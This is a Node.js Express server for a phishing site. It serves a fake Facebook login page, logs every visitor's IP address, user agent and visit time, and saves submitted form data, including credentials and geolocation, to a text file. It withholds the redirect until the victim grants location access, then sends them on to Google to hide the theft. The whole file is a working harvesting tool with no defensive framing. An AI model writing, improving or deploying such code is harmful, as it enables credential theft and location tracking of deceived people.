var https = require('https');
const express = require("express")
const app1 = express() // app1 is for frontend server and backed
const app2 = express() // app2 is for getting credentials
const bodyParser = require("body-parser")
//const ipv6ToIpv4 = require('ipv6-to-ipv4');
const fs=require('fs');

let userIp;
let currentTime;
let userAgent;

app1.use(bodyParser.urlencoded({ extended: false }));

// Handling GET / request
// app.use("/", (req, res, next) => {
//     res.send("This is the express server")
// })

// APP1 CONFIGURATION
app1.get("/", (req, res) => {
  res.sendFile(__dirname + "/facebook.html");
  
  // IP of user
  userIp =  req.headers['x-forwarded-for'] || req.socket.remoteAddress;//req.connection.remoteAddress;
  
  //console.log(userIp);
  // Time when url is visited
   currentTime = new Date();
   //console.log(`URL accessed at: ${currentTime}`);
   userAgent = req.get("User-Agent");
  // console.log(`User IP: ${userIp}`);
  // console.log(`User Agent: ${userAgent}`);
  console.log(`{\twebsite is visited by : ${userAgent}\n\ttime : ${currentTime}\n\tand IP is : ${userIp}\n}`)
});
app1.get("/facebook.css", (req, res) => {
  res.set("Content-Type", "text/css");
  res.sendFile(__dirname + "/facebook.css");
});
app1.get("/facebook.js", (req, res) => {
  res.set("Content-Type", "text/javascript");
  res.sendFile(__dirname + "/facebook.js");
  
});

app1.use('/done',(req,res)=>{
  res.redirect('https://www.google.com')
})

app1.post('/' ,(req,res)=>{
  //const formData = req.body;
  const obj = JSON.parse(JSON.stringify(req.body));
  fs.writeFile("tests.txt", JSON.stringify(req.body), (err) => {
    if (err)
      console.log(err);
    else {
      console.log("File written successfully\n");
      console.log("The written has the following contents:");
      // console.log(fs.readFileSync("books.txt", "utf8"));
    }
  });
  //console.log("\n{"+formData)
  console.log("{\n\tUserIP : "+userIp+",\n\tTime & Date : "+currentTime+",\n\tUserAgent : "+userAgent+",\n\tLocation:")
  console.log(obj)
  console.log("}")
  
  if(obj.longitude===''){
    console.log('blocked')
    res.send("Reload the page and provide access to location")
    
  }
  else{
    res.redirect('done')
  }
  // console.log(formData.latitude);

  //res.send("Form submitted successfully!");

});
//APP2 CONFIGURATION

// Server setup 

https.createServer(
		// Provide the private and public key to the server by reading each
		// file's content with the readFileSync() method.
    {
      key: fs.readFileSync("key.pem"),
      cert: fs.readFileSync("cert.pem"),
    },
    app1
  )
  .listen(3000, () => {
    console.log("serever is runing at port 3000");
  });
//app1.listen(3000, () => {
 //   console.log("Server is Running")
//})

app2.listen(4000,()=>{
  console.log('server 2 is Running')
})

